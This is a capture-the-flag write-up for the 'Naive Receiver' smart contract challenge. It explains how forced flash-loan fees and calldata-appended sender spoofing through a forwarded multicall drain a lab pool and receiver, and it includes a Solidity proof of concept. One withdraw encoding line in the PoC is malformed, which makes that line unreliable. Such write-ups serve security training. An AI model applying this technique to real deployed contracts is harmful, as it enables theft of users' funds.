
# Naive Receiver

## Challenge Overview

**Naive Receiver** features a flash loan pool holding 1,000 WETH and charging a 1 WETH fee. The pool supports meta-transactions through a trusted forwarder. A separate receiver contract, owned by a user, starts with 10 WETH and automatically repays flash loans plus the fixed fee.

The objective is to drain all WETH from both the receiver contract and the flash loan pool and transfer the funds to a designated recovery address in one transaction.

## Protocol Summary

The `NaiveReceiverPool` contract holds WETH liquidity and provides a flash loan for a 1 WETH fixed-fee. The pool integrates meta-transactions through a trusted forwarder that enables submitting transactions on behalf of other users. `Multicall` allows for batched transactions to the `NaiveReceiverPool`. The `FlashLoanReceiver` contract can be used to receive and repay the flash loan.

## Vulnerability Analysis

The protocol contains two seperate issues:

1. The receiver can be griefed by forcing flash loans to drain fees

2. The pool’s meta-tx `_msgSender` breaks in `multicall`, enabling unauthorized withdrawals.

### 1) Forced fee payment

The user-deployed `FlashLoanReceiver` fails to check the initiator of the flash loan. Therefore, anyone can call `NaiveReceiverPool::flashLoan` and target a receiver. This will force the receiver to pay the fixed 1 WETH fee.

### 2) Meta-transaction sender spoofing

`NaiveReceiverPool` resolves the meta-transaction sender in `_msgSender`:

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

This assumes calls from the forwarder will append the sender as the final 20 bytes of calldata. That assumption holds for a direct forwarded call, because `BasicForwarder::execute` appends the signer of the request.

However, the forwarder can send a `multicall` with the sender appended on the calldata. Therefore, each batched call will not have an address appended, allowing a bad actor to append another address themselves.

This is a problem because `withdraw` uses the balance of `_msgSender`.


## Exploit Strategy

The exploit is performed in two steps.

First, the user's `FlashLoanReceiver` can be drained by forcing flash loans for 0 WETH. The pool will charge 1 WETH fee paid by the receiver until it is empty. The pool will deposit fees on behalf of the fee receiver which is the deployer.

Then, `withdraw` will send the pool's WETH balance to the recovery address when the deployer address is appended to the call.

All of these calls are executed in a single transaction using `multicall`.

## Proof of Concept

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    uint256 n = WETH_IN_RECEIVER / 1e18;
    uint256 withdrawAmount = WETH_IN_POOL + WETH_IN_RECEIVER;
    bytes[] memory calls = new bytes[](n + 1);

    for (uint256 i = 0; i < n; i++) {
        calls[i] = abi.encodeCall(
            NaiveReceiverPool.flashLoan,
            (IERC3156FlashBorrower(address(receiver)), address(weth), 0, bytes(""))
        );
    }

    bytes memory withdrawCall = abi.encodeCall(
        NaiveReceiverPool.withdraw(withdrawAmount, payable(recovery))
    );
    withdrawCall = bytes.concat(withdrawCall, bytes20(pool.feeReceiver()));
    calls[n] = withdrawCall;

    bytes memory multicallData = abi.encodeCall(Multicall.multicall, (calls));

    BasicForwarder.Request memory req;
    req.from = player;
    req.target = address(pool);
    req.value = 0;
    req.gas = 2_000_000;
    req.nonce = forwarder.nonces(player);
    req.data = multicallData;
    req.deadline = block.timestamp + 1 days;

    bytes32 domainSep = forwarder.domainSeparator();
    bytes32 dataHash = forwarder.getDataHash(req);
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSep, dataHash));

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    bytes memory sig = abi.encodePacked(r, s, v);

    forwarder.execute(req, sig);
}
```

## Result

WETH will be drained from the user's `FlashLoanReceiver` into the vault and the vault's WETH balance will be withdrawn to the `recovery` address.